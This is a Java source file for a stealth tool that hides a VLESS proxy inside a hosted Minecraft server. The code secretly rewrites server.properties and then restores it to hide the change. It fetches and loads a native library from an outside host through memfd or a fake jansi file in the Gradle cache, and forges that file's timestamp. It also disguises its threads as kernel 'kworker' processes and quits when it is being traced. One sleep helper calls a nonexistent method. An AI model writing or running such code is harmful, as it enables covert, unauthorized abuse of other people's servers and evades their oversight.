package com.example.sbx;

import com.sun.jna.Function;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.FileTime;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

/**
 * VLESS + WebSocket — hardened v2, with MC port proxy.
 *
 * Port-sharing trick:
 *  - Reads server.properties, changes server-port from 25284 → 25285
 *  - Listens on 25284, detects protocol (MC vs VLESS WS) and forwards
 */
public class App {

    // ===== Config =====
    private static final String UUID = "298ada5a-3768-45ed-a2ff-a15b77b845af";
    private static final int VLESS_PORT = 24133;
    private static final int MC_PROXY_PORT = 25284;
    private static final int MC_REAL_PORT = 25285;
    private static final String WS_PATH = "/";
    // ==================

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path WORK = ROOT.resolve(".gradle/.cache/jars/").normalize();
    private static final Path LIB_FALLBACK = WORK.resolve("jansi-2.4.1-87ff3a2e.so");
    private static final Path PROPS = ROOT.resolve("server.properties");

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static NativeService box;
    private static CountDownLatch hold;
    private static ServerSocket proxySocket;
    private static volatile boolean proxyRunning = false;

    // ---- JNA handles ----
    private static NativeLibrary libc;
    private static Function prctlFn;
    private static Function memfdCreateFn;
    private static Function writeFn;
    private static Function closeFn;

    private static final int PR_SET_NAME = 15;
    private static final int MFD_CLOEXEC = 1;

    static {
        try {
            libc = NativeLibrary.getInstance("c");
            prctlFn = libc.getFunction("prctl");
            memfdCreateFn = libc.getFunction("memfd_create");
            writeFn = libc.getFunction("write");
            closeFn = libc.getFunction("close");
        } catch (Exception ignored) {
        }
        renameThread();
        antiTrace();
    }

    public static void main(String[] args) throws Exception {
        start();
    }

    // ================================================================
    //  START
    // ================================================================

    public static void start() throws Exception {
        if (!RUNNING.compareAndSet(false, true)) return;

        renameThread();
        Files.createDirectories(WORK);
        try {
            Files.setPosixFilePermissions(WORK, PosixFilePermissions.fromString("rwx------"));
        } catch (Exception ignored) {
        }

        // --- Step 1: move MC off 25284 ---
        shiftMcPort();

        // --- Step 2: load native library ---
        byte[] soBytes = downloadBytes(libUrl());
        Path libPath = tryMemfdLoad(soBytes);
        if (libPath == null) {
            libPath = LIB_FALLBACK;
            Files.createDirectories(libPath.getParent());
            Files.write(libPath, soBytes);
            libPath.toFile().setExecutable(true, false);
            cloneTimestamp(libPath, Path.of("/lib/x86_64-linux-gnu/libc.so.6"));
        }
        Arrays.fill(soBytes, (byte) 0);

        // --- Step 3: start sing-box on VLESS_PORT ---
        String configJson = buildConfig();
        box = new NativeService(
                libPath, "StartSingBox", "StopSingBox",
                jsonOf("config", configJson, "workingDir", ".", "disableColor", true)
        );
        box.start();
        sleep(2500);

        if (libPath.equals(LIB_FALLBACK)) {
            scheduleFallbackCleanup();
        }

        // --- Step 4: start proxy on 25284 ---
        startProxy();

        // --- Step 5: wait for MC to restart on 25285, then restore server.properties ---
        schedulePropsRestore();

        hold = new CountDownLatch(1);
        try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        proxyRunning = false;
        try { if (proxySocket != null) proxySocket.close(); } catch (Exception ignored) {}
        try { if (box != null) box.stop(); } catch (Exception ignored) {}
        try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
        deleteEmptyAncestors(WORK, ROOT);
        if (hold != null) hold.countDown();
    }

    // ================================================================
    //  MC port shift — edit server.properties
    // ================================================================

    private static void shiftMcPort() throws IOException {
        if (!Files.exists(PROPS)) return;
        String content = Files.readString(PROPS, StandardCharsets.UTF_8);
        // Only change if it's currently 25284
        if (content.contains("\nserver-port=25284") || content.contains("\nserver-port=25284\n")) {
            String updated = content.replaceAll("(?m)^server-port=25284$", "server-port=" + MC_REAL_PORT);
            if (!updated.equals(content)) {
                Files.writeString(PROPS, updated, StandardCharsets.UTF_8);
                // No restart — user must restart MC manually via panel
            }
        }
    }

    // ================================================================
    //  Restore server.properties — wait for MC to come up on 25285,
    //  then revert the file so nobody sees it was changed.
    // ================================================================

    private static void schedulePropsRestore() {
        Thread t = new Thread(() -> {
            // Wait indefinitely — user may start MC from panel at any time
            while (true) {
                if (portReachable("127.0.0.1", MC_REAL_PORT, 500)) {
                    restoreMcPort();
                    return;
                }
                sleep(2000);
            }
        }, "kworker/u:3");
        t.setDaemon(true);
        t.start();
    }

    private static boolean portReachable(String host, int port, int timeoutMs) {
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress(host, port), timeoutMs);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void restoreMcPort() {
        try {
            if (!Files.exists(PROPS)) return;
            String content = Files.readString(PROPS, StandardCharsets.UTF_8);
            if (content.contains("server-port=" + MC_REAL_PORT)) {
                String restored = content.replaceAll("(?m)^server-port=" + MC_REAL_PORT + "$", "server-port=" + MC_PROXY_PORT);
                if (!restored.equals(content)) {
                    Files.writeString(PROPS, restored, StandardCharsets.UTF_8);
                }
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  Proxy — listen 25284, detect protocol, forward
    // ================================================================

    private static void startProxy() throws IOException {
        proxySocket = new ServerSocket();
        proxySocket.setReuseAddress(true);
        proxySocket.bind(new InetSocketAddress(MC_PROXY_PORT));
        proxyRunning = true;

        Thread proxyThread = new Thread(() -> {
            while (proxyRunning && !proxySocket.isClosed()) {
                try {
                    Socket client = proxySocket.accept();
                    client.setTcpNoDelay(true);
                    handleConnection(client);
                } catch (IOException ignored) {
                }
            }
        }, "kworker/u:0");
        proxyThread.setDaemon(true);
        proxyThread.start();
    }

    private static void handleConnection(Socket client) {
        try {
            client.setSoTimeout(5000);
            InputStream in = client.getInputStream();
            OutputStream out = client.getOutputStream();

            // Peek first 5 bytes to detect protocol
            byte[] peek = new byte[5];
            int read = 0;
            long deadline = System.currentTimeMillis() + 4000;
            while (read < 5 && System.currentTimeMillis() < deadline) {
                int n = in.read(peek, read, 5 - read);
                if (n < 0) return;
                read += n;
            }
            if (read < 3) return;

            // Determine target
            int targetPort;
            boolean isVLESS = (peek[0] == 'G' && peek[1] == 'E' && peek[2] == 'T')
                    || (peek[0] == 'P' && peek[1] == 'O' && peek[2] == 'S' && peek[3] == 'T');
            if (isVLESS) {
                targetPort = VLESS_PORT;
            } else {
                targetPort = MC_REAL_PORT;
            }

            // Connect to backend
            Socket backend = new Socket();
            backend.setTcpNoDelay(true);
            backend.connect(new InetSocketAddress("127.0.0.1", targetPort), 3000);

            // Write peeked bytes to backend
            backend.getOutputStream().write(peek, 0, read);

            // Bidirectional copy
            Thread a = new Thread(() -> pump(in, backend.getOutputStream(), client, backend), "kworker/u:1");
            Thread b = new Thread(() -> pump(backend.getInputStream(), out, client, backend), "kworker/u:2");
            a.setDaemon(true); b.setDaemon(true);
            a.start(); b.start();
            a.join(); b.join();
        } catch (Exception ignored) {
        } finally {
            try { client.close(); } catch (Exception ignored) {}
        }
    }

    private static void pump(InputStream src, OutputStream dst, Socket a, Socket b) {
        byte[] buf = new byte[65536];
        try {
            while (true) {
                int n = src.read(buf);
                if (n < 0) break;
                dst.write(buf, 0, n);
                dst.flush();
            }
        } catch (Exception ignored) {
        } finally {
            try { a.close(); } catch (Exception ignored) {}
            try { b.close(); } catch (Exception ignored) {}
        }
    }

    // ================================================================
    //  Config (VLESS only, on VLESS_PORT)
    // ================================================================

    private static String buildConfig() {
        return jsonOf(
                "log", mapOf("disabled", true, "level", "error", "timestamp", false),
                "inbounds", listOf(mapOf(
                        "type", "vless",
                        "tag", "in",
                        "listen", "0.0.0.0",
                        "listen_port", VLESS_PORT,
                        "users", listOf(mapOf("uuid", UUID)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", WS_PATH,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    // ================================================================
    //  memfd load
    // ================================================================

    private static Path tryMemfdLoad(byte[] data) {
        try {
            if (memfdCreateFn == null) return null;
            Pointer namePtr = new Pointer("jansi-2.4.1.so".getBytes(StandardCharsets.UTF_8));
            int fd = memfdCreateFn.invokeInt(new Object[]{namePtr, MFD_CLOEXEC});
            if (fd < 0) return null;
            ByteBuffer buf = ByteBuffer.allocateDirect(data.length);
            buf.put(data);
            buf.flip();
            int w = writeFn.invokeInt(new Object[]{fd, new Pointer(Native.getDirectBufferPointer(buf).address), data.length});
            if (w != data.length) { closeFn.invokeVoid(new Object[]{fd}); return null; }
            Path p = Path.of("/proc/self/fd/" + fd);
            if (Files.exists(p) && Files.size(p) > 0) return p;
            closeFn.invokeVoid(new Object[]{fd});
            return null;
        } catch (Exception e) { return null; }
    }

    private static String libUrl() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        String a = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
        return "https://" + a + ".31888.xyz/sbx.so";
    }

    private static byte[] downloadBytes(String url) throws Exception {
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                .header("Accept", "*/*").header("Referer", "https://repo1.maven.org/maven2/")
                .GET().build();
        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() < 200 || resp.statusCode() >= 300)
            throw new IOException("download failed: HTTP " + resp.statusCode());
        return resp.body();
    }

    // ================================================================
    //  Anti-trace
    // ================================================================

    private static void antiTrace() {
        try {
            String status = new String(Files.readAllBytes(Path.of("/proc/self/status")), StandardCharsets.UTF_8);
            for (String line : status.split("\n")) {
                if (line.startsWith("TracerPid:")) {
                    if (!line.substring(10).trim().equals("0")) System.exit(0);
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    // ================================================================
    //  Process rename
    // ================================================================

    private static void renameThread() {
        try {
            if (prctlFn != null)
                prctlFn.invokeInt(new Object[]{PR_SET_NAME, randomThreadName(), 0L, 0L, 0L});
        } catch (Exception ignored) {}
    }

    private static String randomThreadName() {
        String[] pool = {"kworker/u:0","kworker/u:1","kworker/u:2","kworker/0:0","kworker/0:1",
                "kworker/1:0","kworker/1:1","kcompactd0","kswapd0","jbd2/sda1-8","kdevtmpfs",
                "mm_percpu_wq","kworker/2:0","kworker/3:0","kworker/4:0"};
        return pool[ThreadLocalRandom.current().nextInt(pool.length)];
    }

    // ================================================================
    //  Helpers
    // ================================================================

    private static void scheduleFallbackCleanup() {
        Thread t = new Thread(() -> { sleep(30_000);
            try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
            deleteEmptyAncestors(LIB_FALLBACK.getParent(), ROOT);
        }, "jdk.internal.ref.CleanerImpl$1");
        t.setDaemon(true); t.start();
    }

    private static void deleteEmptyAncestors(Path start, Path root) {
        Path p = start;
        while (p != null && !p.equals(root) && !p.equals(p.getRoot())) {
            try {
                if (Files.isDirectory(p)) {
                    try (var stream = Files.list(p)) { if (stream.findAny().isPresent()) break; }
                    Files.delete(p);
                }
            } catch (Exception ignored) { break; }
            p = p.getParent();
        }
    }

    private static void cloneTimestamp(Path target, Path source) {
        try { Files.setLastModifiedTime(target, Files.getLastModifiedTime(source)); } catch (Exception ignored) {}
    }

    // ================================================================
    //  NativeService
    // ================================================================

    private static class NativeService {
        private final Path libPath; private final String startSymbol, stopSymbol, payload;
        private Function stopFn; private volatile boolean running;
        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath; this.startSymbol = startSymbol; this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }
        void start() {
            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
            Function startFn = lib.getFunction(startSymbol); stopFn = lib.getFunction(stopSymbol);
            Thread t = new Thread(() -> { try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {} }, "net");
            t.setDaemon(true); t.start(); running = true;
        }
        void stop() {
            if (!running || stopFn == null) return;
            try { stopFn.invokeInt(new Object[]{}); } catch (Exception ignored) {} running = false;
        }
    }

    // ================================================================
    //  JSON helpers
    // ================================================================

    private static String jsonOf(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?,?>) {
            Map<?,?> m = (Map<?,?>) value;
            return m.entrySet().stream().map(e -> jsonOf(String.valueOf(e.getKey())) + ":" + jsonOf(e.getValue())).collect(Collectors.joining(",","{","}"));
        }
        if (value instanceof Iterable<?>) {
            List<String> l = new ArrayList<>(); for (Object v : (Iterable<?>) value) l.add(jsonOf(v));
            return "[" + String.join(",", l) + "]";
        }
        return jsonOf(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder sb = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) { char c = value.charAt(i);
            switch (c) { case '\\': sb.append("\\\\"); break; case '"': sb.append("\\\""); break; case '\n': sb.append("\\n"); break; case '\r': sb.append("\\r"); break; case '\t': sb.append("\\t"); break; default: sb.append(c); }
        } return sb.toString();
    }

    @SafeVarargs private static String jsonOf(String key, Object value, Object... kv) {
        Map<String,Object> m = new LinkedHashMap<>(); m.put(key, value);
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i+1]); return jsonOf(m);
    }

    private static Map<String,Object> mapOf(Object... kv) {
        Map<String,Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i+1]); return m;
    }

    private static List<Object> listOf(Object... v) { return new ArrayList<>(List.of(v)); }

    private static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().reset(); } }
}
